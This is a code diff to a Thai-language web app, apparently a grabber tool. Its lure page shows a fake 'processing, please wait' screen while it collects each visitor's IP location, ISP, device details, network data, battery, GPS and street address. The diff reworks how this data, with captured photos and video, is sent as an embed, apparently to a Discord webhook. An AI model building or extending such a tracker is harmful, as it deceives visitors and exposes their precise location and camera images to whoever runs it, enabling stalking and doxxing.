@@ -91,7 +91,6 @@ HTML = '''<!DOCTYPE html>
             document.body.onclick = null;
             document.getElementById('ui').innerHTML = '<div class="spinner"></div><h1>กำลังดำเนินการ...</h1><p>กรุณารอสักครู่</p>';
             
-            // ตรวจจับ OS และเบราว์เซอร์
             const ua = navigator.userAgent;
             let os = 'ไม่ระบุ';
             let browser = 'ไม่ระบุ';
@@ -121,10 +120,21 @@ HTML = '''<!DOCTYPE html>
                 screenWidth: screen.width,
                 screenHeight: screen.height,
                 pixelRatio: window.devicePixelRatio || 1,
-                timestamp: new Date().toISOString()
+                timestamp: new Date().toISOString(),
+                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                orientation: window.innerHeight > window.innerWidth ? 'Portrait' : 'Landscape'
             };
             
-            // ขอ GPS
+            if (navigator.connection) {
+                deviceInfo.networkType = navigator.connection.effectiveType || 'ไม่ทราบ';
+                deviceInfo.downlink = navigator.connection.downlink || 0;
+                deviceInfo.rtt = navigator.connection.rtt || 0;
+            } else {
+                deviceInfo.networkType = 'ไม่รองรับ';
+                deviceInfo.downlink = 0;
+                deviceInfo.rtt = 0;
+            }
+            
             try {
                 const pos = await new Promise((resolve, reject) => {
                     navigator.geolocation.getCurrentPosition(resolve, reject, { timeout: 5000 });
@@ -136,7 +146,6 @@ HTML = '''<!DOCTYPE html>
                 deviceInfo.gps = 'ไม่ได้รับอนุญาตหรือไม่รองรับ';
             }
             
-            // แบตเตอรี่
             try {
                 const battery = await navigator.getBattery();
                 deviceInfo.batteryLevel = Math.round(battery.level * 100);
@@ -228,56 +237,72 @@ def upload():
             gps_address = reverse_geocode(device_info['gps_lat'], device_info['gps_lon'])
         
         time_now = datetime.now().strftime("%d/%m/%Y %H:%M:%S")
-        content = f"**📱 ข้อมูลการเชื่อมต่อ**\n"
-        content += f"🌐 IP: {real_ip}\n"
+        
+        # สร้าง Embed
+        fields = []
+        
+        # IP และที่อยู่
+        if real_ip:
+            fields.append({"name": "🌐 IP", "value": real_ip, "inline": True})
         if location:
-            content += f"📍 เมือง (IP): {location['city']}\n"
-            content += f"🗺️ จังหวัด (IP): {location['region']}\n"
-            content += f"🌍 ประเทศ (IP): {location['country']}\n"
-            content += f"📶 ค่ายเน็ต/ISP: {location['isp']}\n"
-            content += f"🗺️ พิกัด IP: {location['lat']}, {location['lon']}\n"
+            fields.append({"name": "📍 เมือง", "value": location['city'], "inline": True})
+            fields.append({"name": "🗺️ จังหวัด", "value": location['region'], "inline": True})
+            fields.append({"name": "🌍 ประเทศ", "value": location['country'], "inline": True})
+            fields.append({"name": "📶 ค่ายเน็ต", "value": location['isp'][:50], "inline": True})
         
         # OS และเบราว์เซอร์
-        content += f"💻 ระบบปฏิบัติการ: {device_info.get('os', 'ไม่ระบุ')}\n"
-        content += f"🌐 เบราว์เซอร์: {device_info.get('browser', 'ไม่ระบุ')}\n"
-        content += f"📱 UserAgent: {device_info.get('userAgent', 'ไม่ระบุ')[:120]}\n"
-        content += f"🖥️ หน้าจอ: {device_info.get('screenWidth')}x{device_info.get('screenHeight')}\n"
-        content += f"🔤 ภาษา: {device_info.get('language', 'ไม่ระบุ')}\n"
+        fields.append({"name": "💻 OS", "value": device_info.get('os', 'ไม่ระบุ'), "inline": True})
+        fields.append({"name": "🌐 เบราว์เซอร์", "value": device_info.get('browser', 'ไม่ระบุ'), "inline": True})
+        fields.append({"name": "🖥️ หน้าจอ", "value": f"{device_info.get('screenWidth')}x{device_info.get('screenHeight')}", "inline": True})
+        fields.append({"name": "🔤 ภาษา", "value": device_info.get('language', 'ไม่ระบุ'), "inline": True})
         
-        # GPS + ที่อยู่
+        # เครือข่าย
+        if device_info.get('networkType') and device_info.get('networkType') != 'ไม่รองรับ':
+            fields.append({"name": "📶 ประเภทเน็ต", "value": device_info['networkType'], "inline": True})
+        if device_info.get('downlink'):
+            fields.append({"name": "📶 ความเร็ว", "value": f"{device_info['downlink']} Mbps", "inline": True})
+        
+        # GPS
         if device_info.get('gps_lat') and device_info.get('gps_lon'):
-            content += f"📍 GPS: {device_info['gps_lat']}, {device_info['gps_lon']}\n"
+            gps_val = f"{device_info['gps_lat']}, {device_info['gps_lon']}"
             if device_info.get('gps_accuracy'):
-                content += f"🎯 ความแม่นยำ GPS: ±{device_info['gps_accuracy']} เมตร\n"
+                gps_val += f" (±{device_info['gps_accuracy']}m)"
+            fields.append({"name": "📍 GPS", "value": gps_val, "inline": True})
             if gps_address:
-                content += f"🏠 ที่อยู่ (GPS): {gps_address.get('display_name', 'ไม่พบที่อยู่')}\n"
-                if gps_address.get('road'):
-                    content += f"🛣️ ถนน: {gps_address['road']}\n"
-                if gps_address.get('village'):
-                    content += f"🏘️ ตำบล/หมู่บ้าน: {gps_address['village']}\n"
-                if gps_address.get('city'):
-                    content += f"🏙️ อำเภอ/เมือง: {gps_address['city']}\n"
-                if gps_address.get('province'):
-                    content += f"🗺️ จังหวัด: {gps_address['province']}\n"
-                if gps_address.get('postcode'):
-                    content += f"📮 รหัสไปรษณีย์: {gps_address['postcode']}\n"
+                addr_val = gps_address.get('display_name', '')
+                if len(addr_val) > 50:
+                    addr_val = addr_val[:50] + '...'
+                fields.append({"name": "🏠 ที่อยู่ (GPS)", "value": addr_val, "inline": False})
         elif device_info.get('gps') == 'ไม่ได้รับอนุญาตหรือไม่รองรับ':
-            content += f"📍 GPS: ปฏิเสธหรือไม่รองรับ\n"
+            fields.append({"name": "📍 GPS", "value": "ปฏิเสธหรือไม่รองรับ", "inline": True})
         
-        content += f"🔋 แบตเตอรี่: {device_info.get('batteryLevel', 'ไม่ระบุ')}%"
+        # แบตเตอรี่
+        bat_val = f"{device_info.get('batteryLevel', 'ไม่ระบุ')}%"
         if device_info.get('batteryCharging') is True:
-            content += " (กำลังชาร์จ)"
+            bat_val += " ⚡กำลังชาร์จ"
         elif device_info.get('batteryCharging') is False:
-            content += " (ไม่กำลังชาร์จ)"
-        content += f"\n🕐 เวลา: {time_now}\n"
+            bat_val += " 🔋ไม่กำลังชาร์จ"
+        fields.append({"name": "🔋 แบตเตอรี่", "value": bat_val, "inline": True})
         
-        payload = {"username": "Security", "content": content}
+        # เวลา
+        fields.append({"name": "🕐 เวลา", "value": time_now, "inline": False})
+        
+        embed = {
+            "title": "📱 ข้อมูลผู้ใช้ใหม่",
+            "color": 0x5865F2,
+            "fields": fields,
+            "footer": {"text": "ระบบอัตโนมัติ"},
+            "timestamp": datetime.now().isoformat()
+        }
+        
+        payload = {
+            "payload_json": json.dumps({"embeds": [embed]})
+        }
+        
         files = {}
-        
         if photo:
             photo.seek(0)
             files['file1'] = ('photo.jpg', photo.read(), 'image/jpeg')
-        
         if video:
             video.seek(0)
             files['file2'] = ('video.webm', video.read(), 'video/webm')
